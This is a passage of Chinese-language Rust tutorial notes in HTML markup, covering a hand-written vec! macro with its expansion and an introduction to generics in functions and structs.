</span><span id="__span-126-10"><a id="__codelineno-126-10" name="__codelineno-126-10" href="#note-cs-rust-rust-__codelineno-126-10"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-126-11"><a id="__codelineno-126-11" name="__codelineno-126-11" href="#note-cs-rust-rust-__codelineno-126-11"></a><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">temp_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">();</span>
</span><span id="__span-126-12"><a id="__codelineno-126-12" name="__codelineno-126-12" href="#note-cs-rust-rust-__codelineno-126-12"></a><span class="w">            </span><span class="cp">$(</span>
</span><span id="__span-126-13"><a id="__codelineno-126-13" name="__codelineno-126-13" href="#note-cs-rust-rust-__codelineno-126-13"></a><span class="w">                </span><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="cp">$element</span><span class="p">);</span>
</span><span id="__span-126-14"><a id="__codelineno-126-14" name="__codelineno-126-14" href="#note-cs-rust-rust-__codelineno-126-14"></a><span class="w">            </span><span class="p">)</span><span class="o">+</span>
</span><span id="__span-126-15"><a id="__codelineno-126-15" name="__codelineno-126-15" href="#note-cs-rust-rust-__codelineno-126-15"></a><span class="w">            </span><span class="n">temp_vec</span>
</span><span id="__span-126-16"><a id="__codelineno-126-16" name="__codelineno-126-16" href="#note-cs-rust-rust-__codelineno-126-16"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-126-17"><a id="__codelineno-126-17" name="__codelineno-126-17" href="#note-cs-rust-rust-__codelineno-126-17"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-126-18"><a id="__codelineno-126-18" name="__codelineno-126-18" href="#note-cs-rust-rust-__codelineno-126-18"></a><span class="p">}</span>
</span><span id="__span-126-19"><a id="__codelineno-126-19" name="__codelineno-126-19" href="#note-cs-rust-rust-__codelineno-126-19"></a>
</span><span id="__span-126-20"><a id="__codelineno-126-20" name="__codelineno-126-20" href="#note-cs-rust-rust-__codelineno-126-20"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-126-21"><a id="__codelineno-126-21" name="__codelineno-126-21" href="#note-cs-rust-rust-__codelineno-126-21"></a><span class="w">    </span><span class="c1">// 调用宏</span>
</span><span id="__span-126-22"><a id="__codelineno-126-22" name="__codelineno-126-22" href="#note-cs-rust-rust-__codelineno-126-22"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">my_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-126-23"><a id="__codelineno-126-23" name="__codelineno-126-23" href="#note-cs-rust-rust-__codelineno-126-23"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">my_vec</span><span class="p">);</span><span class="w"> </span><span class="c1">// 输出: [1, 2, 3]</span>
</span><span id="__span-126-24"><a id="__codelineno-126-24" name="__codelineno-126-24" href="#note-cs-rust-rust-__codelineno-126-24"></a>
</span><span id="__span-126-25"><a id="__codelineno-126-25" name="__codelineno-126-25" href="#note-cs-rust-rust-__codelineno-126-25"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">empty_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[];</span>
</span><span id="__span-126-26"><a id="__codelineno-126-26" name="__codelineno-126-26" href="#note-cs-rust-rust-__codelineno-126-26"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">empty_vec</span><span class="p">);</span><span class="w"> </span><span class="c1">// 输出: []</span>
</span><span id="__span-126-27"><a id="__codelineno-126-27" name="__codelineno-126-27" href="#note-cs-rust-rust-__codelineno-126-27"></a><span class="p">}</span>
</span></code></pre></div>
<ol>
<li>定义宏 (<code>macro_rules! vec</code>)
<div class="language-rust highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#note-cs-rust-rust-__codelineno-127-1"></a><span class="fm">macro_rules!</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#note-cs-rust-rust-__codelineno-127-2"></a><span class="w">    </span><span class="c1">// 基本情况，空的情况</span>
</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#note-cs-rust-rust-__codelineno-127-3"></a><span class="w">    </span><span class="p">()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4" href="#note-cs-rust-rust-__codelineno-127-4"></a><span class="w">        </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">()</span>
</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5" href="#note-cs-rust-rust-__codelineno-127-5"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-127-6"><a id="__codelineno-127-6" name="__codelineno-127-6" href="#note-cs-rust-rust-__codelineno-127-6"></a>
</span><span id="__span-127-7"><a id="__codelineno-127-7" name="__codelineno-127-7" href="#note-cs-rust-rust-__codelineno-127-7"></a><span class="w">    </span><span class="c1">// 递归情况，带有元素的情况</span>
</span><span id="__span-127-8"><a id="__codelineno-127-8" name="__codelineno-127-8" href="#note-cs-rust-rust-__codelineno-127-8"></a><span class="w">    </span><span class="p">(</span><span class="cp">$($element</span>:<span class="nc">expr</span><span class="p">),</span><span class="o">+</span><span class="w"> </span><span class="cp">$(,</span><span class="p">)</span><span class="o">?</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-9"><a id="__codelineno-127-9" name="__codelineno-127-9" href="#note-cs-rust-rust-__codelineno-127-9"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-127-10"><a id="__codelineno-127-10" name="__codelineno-127-10" href="#note-cs-rust-rust-__codelineno-127-10"></a><span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">temp_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">();</span>
</span><span id="__span-127-11"><a id="__codelineno-127-11" name="__codelineno-127-11" href="#note-cs-rust-rust-__codelineno-127-11"></a><span class="w">            </span><span class="cp">$(</span>
</span><span id="__span-127-12"><a id="__codelineno-127-12" name="__codelineno-127-12" href="#note-cs-rust-rust-__codelineno-127-12"></a><span class="w">                </span><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="cp">$element</span><span class="p">);</span>
</span><span id="__span-127-13"><a id="__codelineno-127-13" name="__codelineno-127-13" href="#note-cs-rust-rust-__codelineno-127-13"></a><span class="w">            </span><span class="p">)</span><span class="o">+</span>
</span><span id="__span-127-14"><a id="__codelineno-127-14" name="__codelineno-127-14" href="#note-cs-rust-rust-__codelineno-127-14"></a><span class="w">            </span><span class="n">temp_vec</span>
</span><span id="__span-127-15"><a id="__codelineno-127-15" name="__codelineno-127-15" href="#note-cs-rust-rust-__codelineno-127-15"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-127-16"><a id="__codelineno-127-16" name="__codelineno-127-16" href="#note-cs-rust-rust-__codelineno-127-16"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-127-17"><a id="__codelineno-127-17" name="__codelineno-127-17" href="#note-cs-rust-rust-__codelineno-127-17"></a><span class="p">}</span>
</span></code></pre></div>
a. 基本情况：空的 <code>Vec</code>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#note-cs-rust-rust-__codelineno-128-1"></a><span class="p">()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#note-cs-rust-rust-__codelineno-128-2"></a><span class="w">    </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">()</span>
</span><span id="__span-128-3"><a id="__codelineno-128-3" name="__codelineno-128-3" href="#note-cs-rust-rust-__codelineno-128-3"></a><span class="p">};</span>
</span></code></pre></div></li>
<li>当宏被调用时，如果没有传递任何参数（即 <code>()</code>），这个模式会匹配。</li>
<li>宏将展开为 <code>Vec::new()</code>，它创建并返回一个空的 <code>Vec</code>。</li>
</ol>
<p>b. 递归情况：带有元素的 <code>Vec</code>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#note-cs-rust-rust-__codelineno-129-1"></a><span class="p">(</span><span class="cp">$($element</span>:<span class="nc">expr</span><span class="p">),</span><span class="o">+</span><span class="w"> </span><span class="cp">$(,</span><span class="p">)</span><span class="o">?</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-129-2"><a id="__codelineno-129-2" name="__codelineno-129-2" href="#note-cs-rust-rust-__codelineno-129-2"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-129-3"><a id="__codelineno-129-3" name="__codelineno-129-3" href="#note-cs-rust-rust-__codelineno-129-3"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">temp_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">();</span>
</span><span id="__span-129-4"><a id="__codelineno-129-4" name="__codelineno-129-4" href="#note-cs-rust-rust-__codelineno-129-4"></a><span class="w">        </span><span class="cp">$(</span>
</span><span id="__span-129-5"><a id="__codelineno-129-5" name="__codelineno-129-5" href="#note-cs-rust-rust-__codelineno-129-5"></a><span class="w">            </span><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="cp">$element</span><span class="p">);</span>
</span><span id="__span-129-6"><a id="__codelineno-129-6" name="__codelineno-129-6" href="#note-cs-rust-rust-__codelineno-129-6"></a><span class="w">        </span><span class="p">)</span><span class="o">+</span>
</span><span id="__span-129-7"><a id="__codelineno-129-7" name="__codelineno-129-7" href="#note-cs-rust-rust-__codelineno-129-7"></a><span class="w">        </span><span class="n">temp_vec</span>
</span><span id="__span-129-8"><a id="__codelineno-129-8" name="__codelineno-129-8" href="#note-cs-rust-rust-__codelineno-129-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-129-9"><a id="__codelineno-129-9" name="__codelineno-129-9" href="#note-cs-rust-rust-__codelineno-129-9"></a><span class="p">};</span>
</span></code></pre></div></p>
<ul>
<li>这个模式匹配一个或多个表达式，表达式之间用逗号分隔。模式中使用了 <code>$($element:expr),+</code>，表示匹配一个或多个表达式。</li>
<li><code>$(,)?</code> 是一个可选的逗号，用于允许在参数列表的末尾加一个逗号。</li>
<li>该模式的展开部分是一个代码块：</li>
<li>创建一个空的 <code>Vec</code>，命名为 <code>temp_vec</code>。</li>
<li>使用 <code>$(...)+</code> 循环，将每个匹配到的表达式（<code>$element</code>）推入到 <code>temp_vec</code> 中。</li>
<li>
<p>最终返回这个填充好的 <code>temp_vec</code>。</p>
</li>
<li>
<p>使用宏
<div class="language-rust highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#note-cs-rust-rust-__codelineno-130-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#note-cs-rust-rust-__codelineno-130-2"></a><span class="w">    </span><span class="c1">// 调用宏</span>
</span><span id="__span-130-3"><a id="__codelineno-130-3" name="__codelineno-130-3" href="#note-cs-rust-rust-__codelineno-130-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">my_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-130-4"><a id="__codelineno-130-4" name="__codelineno-130-4" href="#note-cs-rust-rust-__codelineno-130-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">my_vec</span><span class="p">);</span><span class="w"> </span><span class="c1">// 输出: [1, 2, 3]</span>
</span><span id="__span-130-5"><a id="__codelineno-130-5" name="__codelineno-130-5" href="#note-cs-rust-rust-__codelineno-130-5"></a>
</span><span id="__span-130-6"><a id="__codelineno-130-6" name="__codelineno-130-6" href="#note-cs-rust-rust-__codelineno-130-6"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">empty_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[];</span>
</span><span id="__span-130-7"><a id="__codelineno-130-7" name="__codelineno-130-7" href="#note-cs-rust-rust-__codelineno-130-7"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">empty_vec</span><span class="p">);</span><span class="w"> </span><span class="c1">// 输出: []</span>
</span><span id="__span-130-8"><a id="__codelineno-130-8" name="__codelineno-130-8" href="#note-cs-rust-rust-__codelineno-130-8"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
<li>
<p>在 <code>main</code> 函数中，宏 <code>vec</code> 被调用了两次。</p>
</li>
</ul>
<p>a. 创建一个带有元素的 <code>Vec</code>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#note-cs-rust-rust-__codelineno-131-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">my_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span></code></pre></div></p>
<ul>
<li>这里的宏调用会匹配第二种情况（递归情况）。</li>
<li>
<p>宏展开后相当于以下代码：
  <div class="language-rust highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#note-cs-rust-rust-__codelineno-132-1"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">temp_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">();</span>
</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#note-cs-rust-rust-__codelineno-132-2"></a><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span id="__span-132-3"><a id="__codelineno-132-3" name="__codelineno-132-3" href="#note-cs-rust-rust-__codelineno-132-3"></a><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span id="__span-132-4"><a id="__codelineno-132-4" name="__codelineno-132-4" href="#note-cs-rust-rust-__codelineno-132-4"></a><span class="n">temp_vec</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span id="__span-132-5"><a id="__codelineno-132-5" name="__codelineno-132-5" href="#note-cs-rust-rust-__codelineno-132-5"></a><span class="kd">let</span><span class="w"> </span><span class="n">my_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">temp_vec</span><span class="p">;</span>
</span></code></pre></div></p>
</li>
<li>
<p>打印时，输出 <code>[1, 2, 3]</code>。</p>
</li>
</ul>
<p>b. 创建一个空的 <code>Vec</code>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#note-cs-rust-rust-__codelineno-133-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">empty_vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[];</span>
</span></code></pre></div></p>
<ul>
<li>这里的宏调用会匹配第一种情况（空的情况）。</li>
<li>宏展开后相当于 <code>let empty_vec = Vec::new();</code>。</li>
<li>打印时，输出 <code>[]</code>。</li>
</ul>
</div>
<h2 id="note-cs-rust-rust-rust_3">Rust 泛型与特性<a class="headerlink" href="#note-cs-rust-rust-rust_3" title="Permanent link">&para;</a></h2>
<p>泛型是一个编程语言不可或缺的机制</p>
<p>C++语言中用“模板”来实现泛型，而C语言中却没有泛型的机制，这导致使用C语言来构建类型复杂的工程较为困难。</p>
<p>泛型机制是编程语言用于表达类型抽象的机制，一般用于功能确定，数据类型待定的类，例如链表，映射表等等。</p>
<h3 id="note-cs-rust-rust-_45">在函数中定义泛型<a class="headerlink" href="#note-cs-rust-rust-_45" title="Permanent link">&para;</a></h3>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#note-cs-rust-rust-__codelineno-134-1"></a><span class="k">fn</span> <span class="nf">max</span><span class="p">(</span><span class="n">array</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="kt">i32</span><span class="p">])</span><span class="w"> </span>-&gt; <span class="kt">i32</span> <span class="p">{</span>
</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#note-cs-rust-rust-__codelineno-134-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">max_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#note-cs-rust-rust-__codelineno-134-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#note-cs-rust-rust-__codelineno-134-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">array</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#note-cs-rust-rust-__codelineno-134-5"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">array</span><span class="p">[</span><span class="n">max_index</span><span class="p">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-134-6"><a id="__codelineno-134-6" name="__codelineno-134-6" href="#note-cs-rust-rust-__codelineno-134-6"></a><span class="w">            </span><span class="n">max_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-134-7"><a id="__codelineno-134-7" name="__codelineno-134-7" href="#note-cs-rust-rust-__codelineno-134-7"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-134-8"><a id="__codelineno-134-8" name="__codelineno-134-8" href="#note-cs-rust-rust-__codelineno-134-8"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-134-9"><a id="__codelineno-134-9" name="__codelineno-134-9" href="#note-cs-rust-rust-__codelineno-134-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-134-10"><a id="__codelineno-134-10" name="__codelineno-134-10" href="#note-cs-rust-rust-__codelineno-134-10"></a><span class="w">    </span><span class="n">array</span><span class="p">[</span><span class="n">max_index</span><span class="p">]</span>
</span><span id="__span-134-11"><a id="__codelineno-134-11" name="__codelineno-134-11" href="#note-cs-rust-rust-__codelineno-134-11"></a><span class="p">}</span>
</span><span id="__span-134-12"><a id="__codelineno-134-12" name="__codelineno-134-12" href="#note-cs-rust-rust-__codelineno-134-12"></a>
</span><span id="__span-134-13"><a id="__codelineno-134-13" name="__codelineno-134-13" href="#note-cs-rust-rust-__codelineno-134-13"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-134-14"><a id="__codelineno-134-14" name="__codelineno-134-14" href="#note-cs-rust-rust-__codelineno-134-14"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
</span><span id="__span-134-15"><a id="__codelineno-134-15" name="__codelineno-134-15" href="#note-cs-rust-rust-__codelineno-134-15"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;max = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">max</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="p">));</span>
</span><span id="__span-134-16"><a id="__codelineno-134-16" name="__codelineno-134-16" href="#note-cs-rust-rust-__codelineno-134-16"></a><span class="p">}</span>
</span></code></pre></div>
<p>这是一个简单的取最大值程序，可以用于处理 i32 数字类型的数据，但无法用于 f64 类型的数据。通过使用泛型我们可以使这个函数可以利用到各个类型中去。但实际上并不是所有的数据类型都可以比大小，所以接下来一段代码并不是用来运行的，而是用来描述一下函数泛型的语法格式：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#note-cs-rust-rust-__codelineno-135-1"></a><span class="k">fn</span> <span class="nf">max</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">(</span><span class="n">array</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="n">T</span><span class="p">])</span><span class="w"> </span>-&gt; <span class="nc">T</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#note-cs-rust-rust-__codelineno-135-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">max_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#note-cs-rust-rust-__codelineno-135-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-135-4"><a id="__codelineno-135-4" name="__codelineno-135-4" href="#note-cs-rust-rust-__codelineno-135-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">array</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-135-5"><a id="__codelineno-135-5" name="__codelineno-135-5" href="#note-cs-rust-rust-__codelineno-135-5"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">array</span><span class="p">[</span><span class="n">max_index</span><span class="p">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-135-6"><a id="__codelineno-135-6" name="__codelineno-135-6" href="#note-cs-rust-rust-__codelineno-135-6"></a><span class="w">            </span><span class="n">max_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-135-7"><a id="__codelineno-135-7" name="__codelineno-135-7" href="#note-cs-rust-rust-__codelineno-135-7"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-135-8"><a id="__codelineno-135-8" name="__codelineno-135-8" href="#note-cs-rust-rust-__codelineno-135-8"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-135-9"><a id="__codelineno-135-9" name="__codelineno-135-9" href="#note-cs-rust-rust-__codelineno-135-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-135-10"><a id="__codelineno-135-10" name="__codelineno-135-10" href="#note-cs-rust-rust-__codelineno-135-10"></a><span class="w">    </span><span class="n">array</span><span class="p">[</span><span class="n">max_index</span><span class="p">]</span>
</span><span id="__span-135-11"><a id="__codelineno-135-11" name="__codelineno-135-11" href="#note-cs-rust-rust-__codelineno-135-11"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-_46">结构体与枚举类中的泛型<a class="headerlink" href="#note-cs-rust-rust-_46" title="Permanent link">&para;</a></h3>
<p>Rust 中的结构体和枚举类都可以实现泛型机制</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#note-cs-rust-rust-__codelineno-136-1"></a><span class="k">struct</span> <span class="nc">Point</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#note-cs-rust-rust-__codelineno-136-2"></a><span class="w">    </span><span class="n">x</span>: <span class="nc">T</span><span class="p">,</span>
</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3" href="#note-cs-rust-rust-__codelineno-136-3"></a><span class="w">    </span><span class="n">y</span>: <span class="nc">T</span>
</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4" href="#note-cs-rust-rust-__codelineno-136-4"></a><span class="p">}</span>
</span></code></pre></div>
<p>这是一个点坐标结构体，T 表示描述点坐标的数字类型。我们可以这样使用：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#note-cs-rust-rust-__codelineno-137-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">p1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Point</span><span class="w"> </span><span class="p">{</span><span class="n">x</span>: <span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">y</span>: <span class="mi">2</span><span class="p">};</span>
</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#note-cs-rust-rust-__codelineno-137-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">p2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Point</span><span class="w"> </span><span class="p">{</span><span class="n">x</span>: <span class="mf">1.0</span><span class="p">,</span><span class="w"> </span><span class="n">y</span>: <span class="mf">2.0</span><span class="p">};</span>
</span></code></pre></div>
<p>使用时并没有声明类型，这里使用的是自动类型机制，但不允许出现类型不匹配的情况如下：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#note-cs-rust-rust-__codelineno-138-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Point</span><span class="w"> </span><span class="p">{</span><span class="n">x</span>: <span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">y</span>: <span class="mf">2.0</span><span class="p">};</span>
</span></code></pre></div>
<p>x 与 1 绑定时就已经将 T 设定为 i32，所以不允许再出现 f64 的类型。如果我们想让 x 与 y 用不同的数据类型表示，可以使用两个泛型标识符：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#note-cs-rust-rust-__codelineno-139-1"></a><span class="k">struct</span> <span class="nc">Point</span><span class="o">&lt;</span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">T2</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#note-cs-rust-rust-__codelineno-139-2"></a><span class="w">    </span><span class="n">x</span>: <span class="nc">T1</span><span class="p">,</span>
</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3" href="#note-cs-rust-rust-__codelineno-139-3"></a><span class="w">    </span><span class="n">y</span>: <span class="nc">T2</span>
</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4" href="#note-cs-rust-rust-__codelineno-139-4"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>结构体与枚举类都可以定义方法，那么方法也应该实现泛型的机制，否则泛型的类将无法被有效的方法操作。</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#note-cs-rust-rust-__codelineno-140-1"></a><span class="k">struct</span> <span class="nc">Point</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
